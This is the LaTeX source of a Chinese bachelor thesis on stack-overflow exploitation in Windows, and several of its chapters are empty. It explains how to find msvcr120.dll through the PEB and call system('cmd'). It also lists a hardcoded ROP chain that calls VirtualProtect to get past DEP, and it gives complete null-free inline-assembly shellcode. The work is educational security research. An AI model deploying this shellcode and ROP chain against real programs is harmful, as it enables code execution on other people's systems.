### 2019-11-03 doc/main/paper.tex
update

\documentclass[bachelor]{thesis-uestc}
\usepackage{indentfirst}
\usepackage{amssymb, amsmath}
\usepackage{graphicx, subfigure}
\usepackage{algorithm, algorithmic, float}
% 没有使用thesis-uestc的算法模板, 需将thesis-uestc中的相关内容注释掉, 避免冲突
\usepackage{listings}
\usepackage{fancyhdr}
\usepackage{booktabs}

%\begin{figure}[htbp]
%	\centering\includegraphics[height=10cm]{images/pic.png}
%	\caption{caption_name}
%	\label{fig:pic}
%\end{figure}

%\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]

%\end{lstlisting}

% ----------------------------------------- Document -----------------------------------------

\begin{document}

% ----------------------------------------- 目录 -----------------------------------------
\thesistableofcontents

% ----------------------------------------- 正文 -----------------------------------------
\thesischapterexordium % 第一章 课题背景

\chapter{相关技术介绍}

\chapter{关键技术研究}

\chapter{系统实现}
\section{shellcode设计}
shellcode要实现的功能是：以字符串``cmd''为参数，调用C库的system()函数启动一个shell。

\subsection{获取C库的加载基地址}
在安装了vs2013的win7 x64或x64操作系统中，Release版本的win32程序使用的C库是msvcr120.dll，该DLL在程序加载时被映射到进程的地址空间内，因此需要获取该DLL模块的加载基地址。
win32程序进程的地址空间中，FS:[0x30]处保存着一个指向进程环境块(PEB)的指针。PEB结构如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr; // +0x0c 
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, *PPEB
\end{lstlisting}

PEB结构体偏移+0x0c处是一个指向PEB\_LDR\_DATA结构的指针。PEB\_LDR\_DATA结构如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
typedef struct _PEB_LDR_DATA
{
	ULONG	Length; // +0x00
	BOOLEAN	Initialized; // +0x04
	PVOID	SsHandle; // +0x08
	LIST_ENTRY InLoadOrderModuleList; // +0x0c
	LIST_ENTRY InMemoryOrderModuleList; // +0x14
	LIST_ENTRY InInitializationOrderModuleList;// +0x1c
} PEB_LDR_DATA,*PPEB_LDR_DATA;
\end{lstlisting}

PEB\_LDR\_DATA结构偏移+0x0c处是一个LIST\_ENTRY结构，PEB\_LDR\_DATA::InLoadOrderModuleList.Flink指向一个双向循环链表的头结点，该双向循环链表按照模块的加载顺序将记录模块信息的LDR\_MODULE结构连接起来。LDR\_MODULE结构如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList; // 按加载顺序构成的模块链表 +0x00
	LIST_ENTRY              InMemoryOrderModuleList; // 按内存顺序构成的模块链表 +0x08
	LIST_ENTRY              InInitializationOrderModuleList; // 按初始化顺序构成的模块链表 +0x10
	PVOID                   BaseAddress; // 该模块的基地址 +0x18
	PVOID                   EntryPoint; // 该模块的入口 +0x1c
	ULONG                   SizeOfImage; // 该模块的影像大小 +0x20
	UNICODE_STRING          FullDllName; // 包含路径的模块名 +0x24
	UNICODE_STRING          BaseDllName; // 不包含路径的模块名 +0x28
	ULONG                   Flags;
	SHORT                   LoadCount; // 该模块的引用计数
	SHORT                   TlsIndex;
	HANDLE                  SectionHandle;
	ULONG                   CheckSum;
	ULONG                   TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;
\end{lstlisting}

遍历这个连接了LDR\_MODULE的双向循环链表，如果LDR\_MODULE::BaseDllName与需要查找的模块名相符，就可以从LDR\_MODULE::BaseAddress取得模块基地址。

\subsection{获取C库的system()函数入口地址并完成调用}
system()函数是msvcr120.dll的导出函数，使用PEview打开后可以在SECTION.text的EXPORT Address Table中获得以下信息：RVA 0x35D0处保存着system()的入口RVA为0x808C2（如图\ref{fig:libc_system_rva}所示），那么模块的加载基地址加上0x808C2就是system()的入口地址。

\begin{figure}[htbp]
	\centering\includegraphics[width=10cm]{images/libc_system_rva.png}
	\caption{使用PEview查看msvcr120.dll的EXPORT Address Table}
	\label{fig:libc_system_rva}
\end{figure}

既然要以``cmd''为参数调用system()就要获得该字符串的地址。一种方法是直接将其嵌入shellcode，但这样就需要重定位，从而消耗更多的代码；本着shellcode的代码字节数越少越好的原则，这里选择另一种方法。可以在msvcr120.dll内找到字符串``cmd''，根据其RVA就可以获得实际地址。具体做法是，使用UltraEdit搜索之，然后在PEview中查看其RVA，如图\ref{fig:libc_cmd_rva}所示。

\begin{figure}[htbp]
	\centering\includegraphics[width=12cm]{images/libc_cmd_rva.png}
	\caption{使用PEview查看msvcr120.dll的``cmd''字符串RVA}
	\label{fig:libc_cmd_rva}
\end{figure}

至此，已获得了system()和所需参数的地址，完成函数调用即可。

\subsection{shellcode的调整}
溢出攻击通常是基于strcpy()的漏洞，如果shellcode内包含0x00就会使得shellcode无法被完全拷贝，因此需要消除机器码中的0x00，比如``\# cmp eax, 0''和``\# mov eax, 1''之类指令就不能出现，应该使用等价指令例如``\# test eax, eax''和``\# xor eax, eax \# inc eax''进行替换。\par
还有一个关键问题，shellcode要完成模块msvcr120.dll的查找，此时就会涉及字符串的匹配，那么就需要把字符串``msvcr120.dll''嵌入shellcode，因此需要进行重定位。简单的重定位代码如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
	CALL XXX;
XXX:
	POP EAX;
\end{lstlisting}

首先CALL指令将下一条指令的地址压栈，然后设置EIP为标号XXX的地址，于是就会执行``POP EAX''，而被CALL指令压栈的``下一条指令的地址''正好是标号XXX的实际地址（也就是``POP EAX''这条指令的实际地址），所以它就会被弹入EAX，shellcode就可以知道自己的实际地址，这就是EIP的自定位。但是这样的指令不能应用到shellcode中，因为``CALL XXX''的机器码是``E8 00 00 00 00''。为了实现EIP的自定位，可以使用如下的机器码：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
CODE_ENTRY:
/* 0 */	 0xE8;
/* 1 */	 0xFF;
/* 2 */	 0xFF;
/* 3 */	 0xFF;
/* 4 */	 0xFF; // call 0xFFFFFFFF
LABEL_BASE:
/* 5 */	 0xC2;
/* 6 */	 0x59;
/* 7 */	 0x90;
\end{lstlisting}

``call -1''后LABEL\_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的``FFC2''译码成``inc edx''; 然后执行标号6的``pop ecx''(0x59), 将保存在栈顶的LABEL\_BASE的地址pop进ecx; 之后执行标号7的``nop''(0x90). 至此实现了自定位——LABEL\_BASE的地址被保存在ecx。

\section{突破数据执行保护(DEP)}
突破DEP的方法是使用ROP链构造VirtualProtect()函数调用，将shellcode所在的栈内存设置为可执行。构造ROP链的方式可以使用WinDbg+mona，但是该方法只适用于32位系统，所以gadgets的搜索只能自己编写程序完成。\href{https://www.anquanke.com/post/id/168276}{https://www.anquanke.com/post/id/168276}给出了mona提供的一段ROP链，实际使用时为了简便，我对该ROP链进行了一些修改，修改如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
	0x5a58ed02, // # pop ebp # ret [msvcr120.dll]
	0x5a58ed02, // # skip 4 bytes [msvcr120.dll]
	0x5a582308, // # pop ebx # ret [msvcr120.dll]
	0x00000201, // 0x00000201 -> ebx [msvcr120.dll]
	0x5a58e734, // # pop edx # ret [msvcr120.dll]
	0x00000040, // 0x00000040 -> edx [msvcr120.dll]
	0x5a58ec8c, // # pop ecx # ret [msvcr120.dll]
	0x5a65e000, // &writable location [msvcr120.dll]
	0x5a58f0f3, // # pop edi # ret [msvcr120.dll]
	0x5a58139b, // # ret [msvcr120.dll]
	0x5a58f74a, // # pop esi # ret [msvcr120.dll]
	0x5a58efd7, // # jmp eax [msvcr120.dll]
	0x5a58469c, // # pop eax # ret [msvcr120.dll]
	0x76b743ce, // entry of VirtualProtect() [kernel32.dll]
	0x5a5846a0, // # pushad # ret [msvcr120.dll]
	0x5a5bac78  // # push esp # ret [msvcr120.dll]
\end{lstlisting}

这段ROP链直接跳转到VirtualProtect()的入口，而不是借助mvscr120.dll的IAT。

VirtualProtect()函数原型如下：

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
CODE_ENTRY:
BOOL VirtualProtect(
	LPVOID pAddress,
	SIZE_T dwSize,
	DWORD  NewProtect,
	PDWORD pOldProtect
);
\end{lstlisting}

\begin{figure}[htbp]
	\centering\includegraphics[height=5cm]{images/stack1.png}
	\caption{调用VirtualProtect()时栈的内存布局}
	\label{fig:stack1}
\end{figure}

根据C调用约定，当跳转过去执行VirtualProtect()时栈的内存布局如图\ref{fig:stack1}所示。ROP链的工作就是将相关参数压栈，然后跳转到VirtualProtect()。上面那段ROP链调用VirtualProtect()所使用的参数为：

\begin{itemize}
	\item pAddress = ROP链的最后一个地址（所以需要将shellcode附加到ROP链末尾，这样shellcode就位于VirtualProtect()的影响范围之内）
	\item dwSize = 0x201
	\item NewProtect = PAGE\_EXECUTE\_READWRITE(0x40)
	\item pOldProtect = mvscr120.dll内存映像内的一个可写地址，这可以是.data段内的任意一个地址
\end{itemize}

将上述ROP链和之前构造的shellcode拼接在一起进行栈溢出，就可以突破DEP获得shellcode的执行权，具体的工作流程将在下一章``测试及分析''中详细讨论。

\chapter{测试及分析}
\section{栈内存布局}
栈上的缓冲区被溢出后，内存布局如图\ref{fig:stack2}所示。返回地址被覆盖成ROP链的第一个DWORD，然后RET指令就将EIP指向ROP链的第一个gadget。ROP链上的gadgets执行结束后程序流将被转移到shellcode。

\begin{figure}[htbp]
	\centering\includegraphics[height=6cm]{images/stack2.png}
	\caption{栈上的缓冲区被溢出后的内存布局}
	\label{fig:stack2}
\end{figure}

\section{shellcode}

\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
__asm
{
/*********************************************************/
/*                    CODE_ENTRY                         */
/*********************************************************/
CODE_ENTRY:
/* 0 */	_EMIT 0xE8;
/* 1 */	_EMIT 0xFF;
/* 2 */	_EMIT 0xFF;
/* 3 */	_EMIT 0xFF;
/* 4 */	_EMIT 0xFF; // call 0xFFFFFFFF
LABEL_BASE:
/* 5 */	_EMIT 0xC2;
/* 6 */	_EMIT 0x59;
/* 7 */	_EMIT 0x90;
// "call -1"后LABEL_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的"FFC2"译码成"inc edx";
// 然后执行标号6的"pop ecx"(59), 将保存在栈顶的LABEL_BASE的地址pop进ecx; 之后执行标号7的"nop"(90).
// 至此实现了自定位——LABEL_BASE的地址被保存在ecx
_GetLibcBaseAddress:
	xor ebx, ebx;
	mov eax, fs:[ebx + 0x30]; // linear address of PEB (直接"mov eax,fs:[0x30]"会使代码中出现0x00)
	mov eax, [eax + 0xc]; // 从PEB结构体偏移0xc处取得PEB_LDR_DATA结构体的地址
	mov ebx, [eax + 0xc]; // ebx <- 第一个LDR_MODULE的地址
	mov edx, ebx; // edx保存循环链表的头地址
SEARCH_MODULE_LOOP:
	mov eax, ebx;
	add eax, 0x2C + 0x4; // LDR_MODULE偏移0x2C处是BaseDllName, 一个UNICODE_STRING, 其中偏移0x4处是一个指向UNICODE字符串的指针
	mov esi, [eax];
	mov edi, LIBC_NAME;
	sub edi, LABEL_BASE; // 这两个label的地址中不能出现0x00, 如果有就重新编译知道满足要求
	add edi, ecx;
/*********************************************************/
/*        bool _strcmp(wchar *s1, char *s2)              */
/*        - args: esi = s1, edi = s2(end with '$')       */
/*        - ret: al=1 if equal, al=0 if NOT equal        */
/*********************************************************/
// 这里本可以写成"call _strcmp", 但是这样会在代码中出现0x00, 所以直接将函数嵌入进来
_strcmp:
	push ebx;
LOOP_CMP_STRCMP:
	mov al, [esi];
	mov bl, [edi];
	cmp al, bl;
	je CONTINUE_STRCMP;
	test al, al;
	jnz NOT_EQUAL_STRCMP;
	cmp bl, '$'; // 两个字符串同时结束时al=0,bl='$'
	jne NOT_EQUAL_STRCMP;
	xor al, al;
	inc al; // equal (这两条指令用于替代"mov al,1")
	jmp END_STRCMP;
CONTINUE_STRCMP:
	inc esi;
	inc esi; // 两个"inc esi"一共2字节,一个"add esi,2"却需要3字节
	inc edi;
	jmp LOOP_CMP_STRCMP;
NOT_EQUAL_STRCMP:
	xor al, al; // not equal
END_STRCMP:
	pop ebx;
/******************** end of _strcmp ********************/
	cmp al, 1; // al==1 equal; al==0 not equal
	je MODULE_FOUND;
	mov ebx, [ebx];
	cmp ebx, edx;
	je MODULE_NOT_FOUND; // 循环链表已经遍历完了
	jmp SEARCH_MODULE_LOOP;
MODULE_FOUND:
	mov eax, [ebx + 0x18]; // LDR_MODULE偏移0x18处是模块的线性基地址BaseAddress
_GetSystemFuncEntry:
	mov ebx, eax;
	sub ebx, 0xfff9dec7;
	sub eax, 0xfff7f73e; // 用sub替换add, 使得代码中没有0x00. 加上一个数 <=> 减去这个数的相反数
	//add ebx, 0x62139; // 0x62139是msvcr120.dll中字符串"cmd"的RVA
	//add eax, 0x808c2; // 0x808c2是msvcr120.dll的export address table中记录的system函数的入口RVA
	push ebx;
	call eax; // 获得shell之后就结束了, 不必关注调用结束后的事情
MODULE_NOT_FOUND:
	jmp MODULE_NOT_FOUND; // endless loop
/*********************************************************/
/*                      Data                             */
/*********************************************************/
LIBC_NAME:
	_EMIT 'M';
	_EMIT 'S';
	_EMIT 'V';
	_EMIT 'C';
	_EMIT 'R';
	_EMIT '1';
	_EMIT '2';
	_EMIT '0';
	_EMIT '.';
	_EMIT 'd';
	_EMIT 'l';
	_EMIT 'l';
	_EMIT '$'; // '$'作为结束符, 因为shellcode中不能出现0x00
}
\end{lstlisting}

\chapter{总结及展望}

\end{document}